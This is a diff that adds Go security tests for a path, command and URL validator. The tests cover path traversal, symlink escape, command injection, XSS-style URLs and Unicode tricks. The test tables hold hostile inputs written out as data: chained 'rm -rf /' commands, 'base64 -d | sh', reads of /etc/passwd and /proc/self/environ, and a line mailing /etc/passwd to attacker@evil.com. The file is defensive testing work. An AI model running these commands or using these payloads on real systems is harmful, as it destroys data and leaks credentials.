@@ -1,6 +1,8 @@
 package security
 
 import (
+	"os"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"testing"
@@ -716,4 +718,793 @@ func TestConcurrentValidation(t *testing.T) {
 			t.Errorf("concurrent validation error: %v", err)
 		}
 	}
+}
+
+// ============================================================================
+// SECURITY ATTACK VECTOR TESTS
+// ============================================================================
+
+// TestPathTraversalAttacks tests various path traversal attack vectors
+func TestPathTraversalAttacks(t *testing.T) {
+	tests := []struct {
+		name          string
+		path          string
+		blockedPaths  []string // Use explicit blocked paths for cross-platform testing
+		wantErr       bool
+		errorContains string
+	}{
+		// Classic path traversal attacks using explicit blocked paths
+		{
+			name:          "classic dotdot attack to sensitive directory",
+			path:          "/home/user/../../../sensitive/secret.txt",
+			blockedPaths:  []string{"/sensitive"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+		{
+			name:          "multiple dotdot to access blocked area",
+			path:          "/tmp/../../../../../../restricted/data",
+			blockedPaths:  []string{"/restricted"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+		{
+			name:          "dotdot with extra slashes",
+			path:          "/home/user//..//..//..//blocked/file",
+			blockedPaths:  []string{"/blocked"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+		{
+			name:          "dotdot to system binaries",
+			path:          "/tmp/../bin/sh",
+			blockedPaths:  []string{"/bin"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+		{
+			name:          "dotdot to proc filesystem",
+			path:          "/var/../proc/self/environ",
+			blockedPaths:  []string{"/proc"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+
+		// Test default blocked paths (these work on systems where /proc exists)
+		{
+			name:          "proc filesystem access",
+			path:          "/proc/self/environ",
+			wantErr:       true, // /proc is in default blocked paths
+			errorContains: "path is blocked",
+		},
+
+		// URL encoded path traversal attempts
+		{
+			name:    "percent encoded dotdot",
+			path:    "/home/user/%2e%2e/%2e%2e/safe/file",
+			wantErr: false, // filepath.Clean doesn't decode URLs
+		},
+
+		// Null byte injection attempts
+		{
+			name:    "null byte in path",
+			path:    "/tmp/file.txt\x00.png",
+			wantErr: false, // Go handles null bytes in paths safely
+		},
+		{
+			name:          "null byte traversal",
+			path:          "/blocked/secret\x00/safe/path",
+			blockedPaths:  []string{"/blocked"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+
+		// Windows-style path separators (should be handled by filepath.Clean)
+		{
+			name:    "backslash path separators",
+			path:    "/home\\user\\..\\..\\safe\\file",
+			wantErr: false, // Unix systems don't treat backslashes as separators
+		},
+
+		// Case variation attacks
+		{
+			name:         "case variation attack",
+			path:         "/BLOCKED/secret",
+			blockedPaths: []string{"/blocked"}, // Different case
+			wantErr:      false,                // Case sensitive on Unix
+		},
+
+		// Alternative representations
+		{
+			name:          "double dot with current dir",
+			path:          "/tmp/./../../blocked/secret",
+			blockedPaths:  []string{"/blocked"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+		{
+			name:          "multiple current directory refs",
+			path:          "/./././blocked/secret",
+			blockedPaths:  []string{"/blocked"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+
+		// Extreme path lengths
+		{
+			name:          "very long dotdot chain",
+			path:          "/tmp/" + strings.Repeat("../", 100) + "blocked/secret",
+			blockedPaths:  []string{"/blocked"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+
+		// Cross-platform symlink issues
+		{
+			name:          "path that resolves differently",
+			path:          "/tmp/../var/log/test.log",
+			blockedPaths:  []string{"/var/log"},
+			wantErr:       true,
+			errorContains: "path is blocked",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := NewDefaultValidator()
+			if len(tt.blockedPaths) > 0 {
+				v = v.WithBlockedPaths(tt.blockedPaths)
+			}
+			err := v.ValidatePath(tt.path)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
+				return
+			}
+			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
+				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errorContains)
+			}
+		})
+	}
+}
+
+// TestSymlinkAttacks tests symbolic link based attacks
+func TestSymlinkAttacks(t *testing.T) {
+	// Skip symlink tests if we can't create temporary files
+	if testing.Short() {
+		t.Skip("skipping symlink tests in short mode")
+	}
+
+	// Create temporary directory for testing
+	tmpDir, err := os.MkdirTemp("", "validator_test_*")
+	if err != nil {
+		t.Fatalf("failed to create temp dir: %v", err)
+	}
+	defer func() { _ = os.RemoveAll(tmpDir) }()
+
+	// Resolve tmpDir to handle macOS /var -> /private/var symlink
+	tmpDir, err = filepath.EvalSymlinks(tmpDir)
+	if err != nil {
+		t.Fatalf("failed to resolve tmpDir symlinks: %v", err)
+	}
+
+	// Create a target file outside allowed area
+	targetFile := filepath.Join(tmpDir, "target.txt")
+	if err := os.WriteFile(targetFile, []byte("secret"), 0644); err != nil {
+		t.Fatalf("failed to create target file: %v", err)
+	}
+
+	// Create symlink pointing to target
+	allowedDir := filepath.Join(tmpDir, "allowed")
+	if err := os.MkdirAll(allowedDir, 0755); err != nil {
+		t.Fatalf("failed to create allowed dir: %v", err)
+	}
+
+	symlinkPath := filepath.Join(allowedDir, "link.txt")
+	if err := os.Symlink(targetFile, symlinkPath); err != nil {
+		t.Skipf("skipping symlink test, symlink creation failed: %v", err)
+	}
+
+	tests := []struct {
+		name         string
+		path         string
+		allowedPaths []string
+		wantErr      bool
+	}{
+		{
+			name:         "symlink pointing outside allowed directory should fail",
+			path:         symlinkPath,
+			allowedPaths: []string{allowedDir},
+			wantErr:      true,
+		},
+		{
+			name:         "symlink pointing to allowed area should pass",
+			path:         symlinkPath,
+			allowedPaths: []string{tmpDir}, // Allow the entire temp dir
+			wantErr:      false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := NewDefaultValidator().WithAllowedPaths(tt.allowedPaths)
+			err := v.ValidatePath(tt.path)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+// TestCommandInjectionAttacks tests various command injection attack vectors
+func TestCommandInjectionAttacks(t *testing.T) {
+	tests := []struct {
+		name          string
+		cmd           string
+		args          []string
+		wantErr       bool
+		errorContains string
+	}{
+		// Semicolon injection attacks
+		{
+			name:          "semicolon command injection",
+			cmd:           "echo hello; rm -rf /",
+			wantErr:       false, // Only first command word is validated
+			errorContains: "",
+		},
+		{
+			name:    "multiple semicolon commands",
+			cmd:     "ls; cat /etc/passwd; wget malicious.com",
+			wantErr: false, // Only first command is checked
+		},
+
+		// Ampersand injection attacks
+		{
+			name:    "ampersand background execution",
+			cmd:     "sleep 1 & rm -rf /",
+			wantErr: false, // Only first command word is validated
+		},
+		{
+			name:    "double ampersand conditional",
+			cmd:     "true && rm -rf /",
+			wantErr: false, // Only first command word is validated
+		},
+
+		// Pipe injection attacks
+		{
+			name:    "pipe to dangerous command",
+			cmd:     "cat file.txt | sudo tee /etc/passwd",
+			wantErr: false, // Only first command word is validated
+		},
+		{
+			name:    "complex pipe chain",
+			cmd:     "echo data | base64 -d | sh",
+			wantErr: false, // Only first command word is validated
+		},
+
+		// Backtick/command substitution attacks
+		{
+			name:    "backtick command substitution",
+			cmd:     "echo `whoami`",
+			wantErr: false, // Command parsing doesn't evaluate substitution
+		},
+		{
+			name:    "dollar parentheses substitution",
+			cmd:     "echo $(rm -rf /)",
+			wantErr: false, // Command parsing doesn't evaluate substitution
+		},
+
+		// Redirection attacks
+		{
+			name:    "output redirection",
+			cmd:     "echo secret > /etc/passwd",
+			wantErr: false, // Only first command word is validated
+		},
+		{
+			name:    "input redirection",
+			cmd:     "mail attacker@evil.com < /etc/passwd",
+			wantErr: false, // Only first command word is validated
+		},
+
+		// Environment variable attacks
+		{
+			name:    "environment variable in command",
+			cmd:     "$SHELL -c 'rm -rf /'",
+			wantErr: false, // Variable not expanded during validation
+		},
+
+		// Path manipulation attacks
+		{
+			name:          "relative path to blocked command",
+			cmd:           "../../../bin/rm -rf /",
+			wantErr:       true,
+			errorContains: "command is blocked",
+		},
+		{
+			name:          "hidden command with dots",
+			cmd:           "./rm -rf /",
+			wantErr:       true,
+			errorContains: "command is blocked",
+		},
+
+		// Unicode and encoding attacks
+		{
+			name:    "unicode similar characters",
+			cmd:     "ｒｍ -rf /", // Full-width characters
+			wantErr: false,      // Different unicode characters
+		},
+
+		// Whitespace variations
+		{
+			name:          "tab separated command",
+			cmd:           "rm\t-rf\t/",
+			wantErr:       true,
+			errorContains: "command is blocked",
+		},
+		{
+			name:    "newline in command",
+			cmd:     "echo\nrm -rf /",
+			wantErr: false, // Newline treated as part of argument
+		},
+
+		// Null byte injection
+		{
+			name:    "null byte in command",
+			cmd:     "echo\x00rm -rf /",
+			wantErr: false, // Null byte handled safely by Go
+		},
+
+		// Very long commands
+		{
+			name:    "extremely long command",
+			cmd:     "echo " + strings.Repeat("A", 10000),
+			wantErr: false, // Length not validated
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := NewDefaultValidator()
+			err := v.ValidateCommand(tt.cmd, tt.args)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
+				return
+			}
+			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
+				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errorContains)
+			}
+		})
+	}
+}
+
+// TestMaliciousURLAttacks tests various malicious URL attack vectors
+func TestMaliciousURLAttacks(t *testing.T) {
+	tests := []struct {
+		name          string
+		url           string
+		wantErr       bool
+		errorContains string
+	}{
+		// JavaScript injection attacks
+		{
+			name:          "javascript protocol",
+			url:           "javascript:alert('xss')",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+		{
+			name:          "javascript with encoded characters",
+			url:           "javascript%3Aalert('xss')",
+			wantErr:       true,
+			errorContains: "invalid URL scheme", // Go parses this as scheme "javascript%3Aalert"
+		},
+		{
+			name:          "mixed case javascript",
+			url:           "JaVaScRiPt:alert(1)",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+
+		// Data URL attacks
+		{
+			name:          "data URL with script",
+			url:           "data:text/html,<script>alert('xss')</script>",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+		{
+			name:          "data URL with base64",
+			url:           "data:text/plain;base64,SGVsbG8gV29ybGQ=",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+
+		// File protocol attacks
+		{
+			name:          "file protocol to etc/passwd",
+			url:           "file:///etc/passwd",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+		{
+			name:          "file protocol windows",
+			url:           "file://C:/Windows/System32/drivers/etc/hosts",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+
+		// Other dangerous protocols
+		{
+			name:          "ftp protocol",
+			url:           "ftp://malicious.com/upload",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+		{
+			name:          "ldap protocol",
+			url:           "ldap://evil.com/",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+		{
+			name:          "gopher protocol",
+			url:           "gopher://evil.com:70/",
+			wantErr:       true,
+			errorContains: "invalid URL scheme",
+		},
+
+		// Localhost/internal network attacks
+		{
+			name:          "localhost with port",
+			url:           "http://localhost:8080/admin",
+			wantErr:       true,
+			errorContains: "localhost access denied",
+		},
+		{
+			name:          "127.0.0.1 loopback",
+			url:           "https://127.0.0.1:3000/",
+			wantErr:       true,
+			errorContains: "localhost access denied",
+		},
+		{
+			name:          "IPv6 loopback",
+			url:           "http://[::1]:8000/",
+			wantErr:       true,
+			errorContains: "localhost access denied",
+		},
+		{
+			name:          "localhost subdomain",
+			url:           "https://app.localhost.example.com",
+			wantErr:       true,
+			errorContains: "localhost access denied",
+		},
+		{
+			name:    "alternative localhost representations",
+			url:     "http://0.0.0.0:8080",
+			wantErr: false, // Not explicitly blocked
+		},
+
+		// Private network ranges (not blocked by current implementation)
+		{
+			name:    "private IP 192.168.x.x",
+			url:     "http://192.168.1.1/",
+			wantErr: false, // Only localhost specifically blocked
+		},
+		{
+			name:    "private IP 10.x.x.x",
+			url:     "http://10.0.0.1:8080/",
+			wantErr: false, // Only localhost specifically blocked
+		},
+
+		// Malformed URL attacks
+		{
+			name:          "URL with spaces",
+			url:           "https://example .com",
+			wantErr:       true,
+			errorContains: "invalid URL format",
+		},
+		{
+			name:          "URL with null bytes",
+			url:           "https://example.com\x00.evil.com",
+			wantErr:       true, // Go's url.Parse actually rejects this
+			errorContains: "invalid URL format",
+		},
+		{
+			name:          "URL with newlines",
+			url:           "https://example.com\n\rLocation: evil.com",
+			wantErr:       true, // Go's url.Parse actually rejects this
+			errorContains: "invalid URL format",
+		},
+
+		// Unicode attacks
+		{
+			name:    "IDN homograph attack",
+			url:     "https://аpple.com", // Cyrillic 'а' instead of Latin 'a'
+			wantErr: false,               // Unicode domains are valid
+		},
+		{
+			name:    "mixed script attack",
+			url:     "https://gооgle.com", // Mix of Latin and Cyrillic
+			wantErr: false,                // Unicode domains are valid
+		},
+
+		// Protocol confusion
+		{
+			name:    "uppercase HTTP",
+			url:     "HTTP://example.com",
+			wantErr: false, // Go normalizes schemes to lowercase
+		},
+		{
+			name:    "mixed case scheme",
+			url:     "HtTpS://example.com",
+			wantErr: false, // Go normalizes schemes to lowercase
+		},
+
+		// Port manipulation
+		{
+			name:    "non-standard HTTP port",
+			url:     "http://example.com:8080/",
+			wantErr: false, // Non-standard ports are allowed
+		},
+		{
+			name:    "very high port number",
+			url:     "https://example.com:65535/",
+			wantErr: false, // High ports are valid
+		},
+
+		// Extremely long URLs
+		{
+			name:    "very long URL",
+			url:     "https://example.com/" + strings.Repeat("a", 5000),
+			wantErr: false, // Length not limited
+		},
+		{
+			name:    "long subdomain",
+			url:     "https://" + strings.Repeat("sub.", 100) + "example.com",
+			wantErr: false, // Long subdomains are valid
+		},
+
+		// Empty/missing components
+		{
+			name:          "empty host after scheme",
+			url:           "https:///path",
+			wantErr:       true,
+			errorContains: "URL must have a host",
+		},
+		{
+			name:          "scheme only",
+			url:           "https://",
+			wantErr:       true,
+			errorContains: "URL must have a host",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := NewDefaultValidator()
+			err := v.ValidateURL(tt.url)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateURL() error = %v, wantErr %v", err, tt.wantErr)
+				return
+			}
+			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
+				t.Errorf("ValidateURL() error = %v, want error containing %q", err, tt.errorContains)
+			}
+		})
+	}
+}
+
+// TestBoundaryConditions tests edge cases and boundary conditions
+func TestBoundaryConditions(t *testing.T) {
+	t.Run("empty inputs", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Empty path
+		if err := v.ValidatePath(""); err == nil {
+			t.Error("expected empty path to fail")
+		}
+
+		// Empty command
+		if err := v.ValidateCommand("", nil); err == nil {
+			t.Error("expected empty command to fail")
+		}
+
+		// Empty URL
+		if err := v.ValidateURL(""); err == nil {
+			t.Error("expected empty URL to fail")
+		}
+	})
+
+	t.Run("whitespace-only inputs", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Whitespace-only command
+		if err := v.ValidateCommand("   \t\n  ", nil); err == nil {
+			t.Error("expected whitespace-only command to fail")
+		}
+	})
+
+	t.Run("very long inputs", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Very long path
+		longPath := "/tmp/" + strings.Repeat("a", 4096)
+		if err := v.ValidatePath(longPath); err != nil {
+			t.Errorf("expected long valid path to pass, got: %v", err)
+		}
+
+		// Very long command
+		longCmd := "echo " + strings.Repeat("a", 4096)
+		if err := v.ValidateCommand(longCmd, nil); err != nil {
+			t.Errorf("expected long valid command to pass, got: %v", err)
+		}
+	})
+
+	t.Run("unicode handling", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Unicode in paths
+		unicodePath := "/tmp/файл.txt" // Russian filename
+		if err := v.ValidatePath(unicodePath); err != nil {
+			t.Errorf("expected unicode path to pass, got: %v", err)
+		}
+
+		// Unicode in commands
+		unicodeCmd := "echo \"привет\"" // Russian text
+		if err := v.ValidateCommand(unicodeCmd, nil); err != nil {
+			t.Errorf("expected unicode command to pass, got: %v", err)
+		}
+
+		// Unicode in URLs
+		unicodeURL := "https://пример.рф" // Russian domain
+		if err := v.ValidateURL(unicodeURL); err != nil {
+			t.Errorf("expected unicode URL to pass, got: %v", err)
+		}
+	})
+
+	t.Run("special characters", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Special characters in paths
+		specialPath := "/tmp/file with spaces & symbols!@#$%^&*()_+-={}[]|\\:;\"'<>?,.~`"
+		if err := v.ValidatePath(specialPath); err != nil {
+			t.Errorf("expected path with special chars to pass, got: %v", err)
+		}
+
+		// Control characters
+		for i := 0; i < 32; i++ {
+			controlChar := string(rune(i))
+			pathWithControl := "/tmp/file" + controlChar + ".txt"
+			// These should generally pass as Go handles them safely
+			_ = v.ValidatePath(pathWithControl) // Just ensure no panic
+		}
+	})
+
+	t.Run("nil and invalid inputs", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Command with nil args should work
+		if err := v.ValidateCommand("echo test", nil); err != nil {
+			t.Errorf("expected command with nil args to pass, got: %v", err)
+		}
+	})
+}
+
+// TestUnicodeAttacks tests Unicode-based security attacks
+func TestUnicodeAttacks(t *testing.T) {
+	tests := []struct {
+		name    string
+		input   string
+		test    func(*DefaultValidator, string) error
+		wantErr bool
+	}{
+		// Unicode normalization attacks
+		{
+			name:    "NFD normalization in path",
+			input:   "/tmp/cafe\u0301.txt", // café with combining accent
+			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
+			wantErr: false,
+		},
+		{
+			name:    "NFKC normalization attack",
+			input:   "/tmp/\uFF2E\uFF2F\uFF32\uFF2D\uFF21\uFF2C.txt", // "NORMAL" in fullwidth
+			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
+			wantErr: false,
+		},
+
+		// Bidirectional text attacks
+		{
+			name:    "RTL override in filename",
+			input:   "/tmp/file\u202etxt.exe", // RLO character
+			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
+			wantErr: false,
+		},
+
+		// Zero-width characters
+		{
+			name:    "zero width space in command",
+			input:   "ec\u200Bho test", // Zero-width space
+			test:    func(v *DefaultValidator, s string) error { return v.ValidateCommand(s, nil) },
+			wantErr: false,
+		},
+		{
+			name:    "zero width non-joiner",
+			input:   "https://exam\u200Cple.com",
+			test:    func(v *DefaultValidator, s string) error { return v.ValidateURL(s) },
+			wantErr: false,
+		},
+
+		// Homograph attacks
+		{
+			name:    "cyrillic homograph",
+			input:   "https://аpple.com", // Cyrillic 'а'
+			test:    func(v *DefaultValidator, s string) error { return v.ValidateURL(s) },
+			wantErr: false,
+		},
+
+		// Overlong UTF-8 sequences (Go handles these correctly)
+		{
+			name:    "valid unicode path",
+			input:   "/tmp/\u0041\u0042\u0043.txt", // ABC in Unicode
+			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
+			wantErr: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			v := NewDefaultValidator()
+			err := tt.test(v, tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("test failed: error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+// TestErrorHandling tests error handling and edge cases
+func TestErrorHandling(t *testing.T) {
+	t.Run("validator configuration errors", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Test with empty allowed paths list
+		v.WithAllowedPaths([]string{})
+		if err := v.ValidatePath("/any/path"); err != nil {
+			t.Errorf("expected path to pass with empty allowed list, got: %v", err)
+		}
+
+		// Test with empty blocked paths list
+		v = NewDefaultValidator()
+		v.blockedPaths = []string{} // Clear default blocked paths
+		if err := v.ValidatePath("/etc/passwd"); err != nil {
+			t.Errorf("expected path to pass with empty blocked list, got: %v", err)
+		}
+	})
+
+	t.Run("malformed URL parsing", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		malformedURLs := []string{
+			"ht!tp://example.com",
+			"https://[invalid-ipv6",
+			"%zzexample.com",
+		}
+
+		for _, malformedURL := range malformedURLs {
+			err := v.ValidateURL(malformedURL)
+			if err == nil {
+				t.Errorf("expected malformed URL %q to fail", malformedURL)
+			}
+		}
+	})
+
+	t.Run("filesystem permission errors", func(t *testing.T) {
+		v := NewDefaultValidator()
+
+		// Test with non-existent symlink target (should not fail validation)
+		nonExistentPath := "/path/that/does/not/exist/symlink"
+		// This should pass validation as the path itself is not blocked
+		if err := v.ValidatePath(nonExistentPath); err != nil {
+			t.Errorf("expected non-existent path to pass validation, got: %v", err)
+		}
+	})
 }
